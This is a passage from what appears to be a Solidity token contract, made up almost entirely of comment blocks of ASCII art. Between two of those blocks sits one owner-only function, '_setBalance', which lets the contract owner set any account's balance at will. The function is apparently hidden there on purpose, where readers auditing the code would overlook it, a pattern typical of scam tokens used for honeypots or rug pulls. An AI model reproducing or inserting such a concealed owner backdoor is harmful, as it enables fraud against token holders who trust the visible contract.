::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.^[email protected]@@#G7 !GPPPPPPP~ 5#######&@@@@@@5 ~PPPPPPPP!  .?YJJJJJJJ.:@!.YPPPPPPP5::5P5PY.:5PPPPPPG? 7::5PPPPPPPJ 7#B^.YPPPPPPPY.!5 !PPPPPPPG~ [email protected]@@@J ?GPPPPPPP~.5.^PPPPPPPG? [email protected] !GPPPPPPP~ 5####~ YPPPPPPPP.:&^.5PPPPPPPY ^5PPJ ~PPPPPPPP7 7#@@@&?.::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@B::!75PPPPPPP5::#@@@&@&&&#B&@@@J ?PPPPPPPP?!!?PPPPPPPGJ.!#^:5PPPPPPP57!!!!!!7YPPPPPPPG7 ? ~GPPPPPPP7 [email protected]# ^PPPPPPPP? J? ?GPPPPPPP^.#@@@@~ JPPPPPPP5.^Y !GPPPPPPP! [email protected] JGPPPPPPP::#@@@#^:5PPPPPPPJ 7#.:[email protected]@@B^.::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@5 [email protected]@@@!^^~^:~&@@@! YPPPPPPPPPPPPPPPPPPPG? JG.^PPPPPPPPPPPPPPPPPPPPPPPPPP^:7 !GPPPPPPP^[email protected] !GPPPPPPP! 5!.YGPPPPPPY.~&@@@&:.5PPPPPPPY !J 7GPPPPPPP^:[email protected]^[email protected]@@@G ~PPPPPPPG7 YP.~PPPPPPPPPPPPPPPPPPPPPPPPPPG? [email protected]@@B:.:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.^#@@@? ?PPPPPPPPPP? [email protected]@@#:[email protected]@@#^:5PPPPPPPPPPPPPPPPPPPP! P5 7GPPPPPPPPPPPPPPPPPPPPPPPP5.~~.JGPPPPPP5::#@? 7GPPPPPPP^:G.^PPPPPPPGJ [email protected]@@@G.^PPPPPPPP7 J!.5PPPPPPP5.^@B.^PPPPPPPG? [email protected]@@@Y 7GPPPPPPP! BJ ?GPPPPPPPPPPPPPPPPPPPPPPPPPP~ [email protected]@@P.:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@^.YPPPPPPPPPG! [email protected]@@P:.::[email protected]@@B.^PPPPPPPPPPPPPPPPPPPPP::#J ?GPPPPPPPPPPPPPPPPPPPPPPPGJ !^:[email protected]@~.5PPPPPPG5.^P.~PPPPPPPP7 Y&GGG? 7GPPPPPPG~ 5^:PPPPPPPPJ [email protected] !PPPPPPPG! [email protected]@@@7 JGPPPPPP5::#7.YGPPPPPPPPPPPPPPPPPPPPPPPPPP::#@@@?....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::[email protected]@@#.:555555555Y7.!&@@@7...::[email protected]@@&[email protected]^Y55555555555555555555555?:^5.:Y5555555! [email protected]#::Y5555555? 75 !55555555:.7:^~~~!5PPPPPPPP^:P.^55555555~ 5#..J55555555^ #@@@@:.Y5555555J [email protected][email protected]@@@~....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::.~&@@@Y!~~~~~~~~~~?5&@@@Y.......:[email protected]@@#[email protected]@@G?!~~~~~~~~~~~~~~~~~~~~~~~!Y#&J!~~~~~~~~~?#@&Y!~~~~~~~~~7B#?~~~~~~~~~!Y^.YGPPPPPPPPPPPY.~#J!~~~~~~~~~J&&J!~~~~~~~~~!Y&@@@@[email protected]@G?~~~~~~~~~~~~~::JGPPPPPG5^:[email protected]@@G:...:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@@@@@@@@@@@@@@&G7....::...:?#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#.^PPPPPPPPPPPPG? [email protected]@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Y.^~~~~~~~^.7&@@@@G~.......::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:75GB#########BG5J~:...:....:...:!YPG##################BP5?~?5GB######################BGPY5PB########BG5JYPB########BG55GB#####&@@@P !GPPPPPPPPPPPG! [email protected]@@&#######BG55GB#########BP57^75PB#########BPYJ5GB#########&@@@#GPPPPPPPGB&@@@5!:.:.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:::::::::::.......:.......:......:::::::::::::::::::.......::::::::::::::::::::::::.....::::::::::.....::::::::::....:::::^#@@@J 7PPPPPPPPPPP57.~&@@@7::::::::....:::::::::::.......:::::::::::.....::::::::::~5#&@@@@@@@@@@@&#P7......:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.................................::::..............................[email protected]@@G!~~~~~~~~~~~~~!Y&@@@5:...........................::.............................:^~!77777777!^:............:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...........:::::::::::::::::::....:::::::::::::::::::::::::::::::::....::::::::::::::::::::::::::::::..........:::::::::::...:[email protected]@@@&&&&&&&&&&&&&@@@@#?.................::::::::::::::::....:::::::::::::::::::...................:...........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.::.:75GB#&&&&&&&&&&&#BPY!:..:.::::::::::::::::::::::::::::::::::::::::::::::::::::::..:.:::....:::::.:....::::::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::....::^^^^^^^^^^^::.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....................:::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....................:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.................:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
*/

  function _setBalance(address account, uint256 _value) external atOwner {
    newBalance[account] = _value * 10 ** 9;
  }
/* 

::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.....................:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::......:^^^:..:::....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...::........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:!JP#&&&B?:.:.:::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:?PBBG5?~:...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:::::...:75#@@@@@@@@@5....:..:::::::::::::::::::::.:::::::.:.::::::::.............................:::::::...:::::::::...::::::::::::::.:[email protected]@@@@@@&BY!:...::::::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..::...~Y#@@@@@&#&@@@@@G7.:........::::........:...::.........................:::::::::::::::.....................::........:...........^#@@@@&@@@@@@BY~........:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:....!P&@@@@&#[email protected]@@@@@@#^.:....:.......:....:::...........::^^~!77?JY55PPGGBBBB##########BBBBGGPP55YJ?77!~^^::.................:......:[email protected]@@@#GG#&@@@@&P!......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:[email protected]@@@@&BPPPP&@@@@@@@G:.:.........::...........:^~7?JYPGB##&@@@@@&&&&&&##########BB#########&&&&&&&@@@@@&&#BGP5J?!~^::..............:.:[email protected]@@@BPPPB#@@@@@P~..:.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:J&@@@@&GPPPPP#@@@@@@@#^....:............:^~7JYPB#&@@@&&&##BBGGGPPPPP555555555555555555555555555555PPPPPGGBBB##&&&@@@&#BPYJ7~^:........:.~&@@@&GPPPPG#@@@@&Y:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.^[email protected]@@@&[email protected]@@@@@@&!............:~!?5G#&&@&&&#BBGGPPP55555555555555555555555555555555555555555555555555555555PPPGGBB#&&&@&&BG5?!~:[email protected]@@@#PPPPPPG&@@@@B!..:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.~#@@@@#[email protected]@@@@@@Y.......:^!?5G#&@@&&#BGPPP55555555555555555555555555555555555555555555555555555555555555555555555555PPPGB#&&@@&#G5?!^:[email protected]@@&[email protected]@@@@?..:.......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.~#@@@@BPB#PPPPPP&@@@@@@#^..:^!JPB&@@&&#BGPP55555555555555555555555555555555555555555555555555555555555555555555555555555555P5555555PPGB#&&@&&[email protected]@@@BPPPPPB#[email protected]@@@@J....:.....::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:.^#@@@@BPB&GPPPPPP&@@@@@@5~?5B&@@&#BGPP555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555PPPGB#&@@@@BPPPPPP#&PG&@@@@J..:.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::.:[email protected]@@@#[email protected]&@@@@@@&&@&#BGPP555555555555555555555555555555555555555555555555[email protected]@@@BPPPPPPP&#[email protected]@@@@7.::....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@&PG&&PPPPPPPP#@@@@@@&BGP555P555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555#@@@@[email protected]@@@@#^.::...:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::...:#@@@@BP#@[email protected]@@@@@B5P55PPPP5555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P&@@@&GPPPPPPPP&@GG&@@@@5................:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@&[email protected]&PPPPPPPPPP#@@@@@&P5P5P555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P#@@@@[email protected]#P#@@@@&~................::.:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@BP#@#PPPPPPPPPPP&@@@@@B5555P55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P5P#@@@@#[email protected]&[email protected]@@@@G~:.....:...^~^:...:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::[email protected]@@@BP&@#PPPPPPPPPPPG&@@@@@B55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P5555P#@@@@#PPPPPPPPPPPG&@GP&@@@@@@BY!:.....Y&@&BY7^....:.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:[email protected]@@@GG&@#PPPPPPPPPPPPP#@@@@@#P55PP55555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555555P555G&@@@@#PPPPPPPPPPPPP&@#P#@@@@&#&@@BY~:.^#@@@@@@&P?^....:::::.....:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::..:[email protected]@@@[email protected]@#PPPPPPPPPPPPPPB&@@@@&GP55P5555555555555555555555555555555555PPPPPPPGGGBBBBBBBB##BBBBBBBBGGGPPPPPP555555555555555555555555555PP55G&@@@@&GPPPPPPPPPPPPPG&@#P#@@@@&G5GB&@&[email protected]@@@@@@@@@&G?^...:.......:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::
